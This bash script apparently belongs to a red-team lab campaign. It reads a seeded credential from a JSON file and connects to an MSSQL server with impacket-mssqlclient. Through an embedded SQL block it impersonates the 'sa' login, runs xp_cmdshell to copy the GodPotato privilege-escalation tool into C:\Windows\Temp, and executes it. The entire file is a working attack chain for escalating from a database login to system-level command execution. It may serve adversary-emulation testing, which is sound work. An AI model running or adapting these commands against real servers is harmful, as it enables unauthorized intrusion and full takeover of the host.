#!/usr/bin/env bash
set -euo pipefail
export PATH="$HOME/.local/bin:/usr/local/bin:$PATH"
SEED="$HOME/CADRE/attack-matrix/Campaign/automation/lab-seed-creds.json"
PW="$(python3 -c "import json; print(json.load(open('$SEED'))['credentials']['analyst_t1']['password'])")"
SQLF="$(mktemp)"
cat >"$SQLF" <<'SQL'
EXECUTE AS LOGIN = 'sa';
EXEC master..xp_cmdshell 'cmd /c copy /y C:\Windows\Temp\cadre-tools\GodPotato-NET4.exe C:\Windows\Temp\gp-net4.exe';
EXEC master..xp_cmdshell 'C:\Windows\Temp\gp-net4.exe -cmd "cmd /c whoami"';
REVERT;
SQL
echo "======== $(date -u +%Y-%m-%dT%H:%M:%SZ) GodPotato copy+run ========"
timeout 60 impacket-mssqlclient "analyst_t1:${PW}@192.168.77.22" -file "$SQLF"
rm -f "$SQLF"
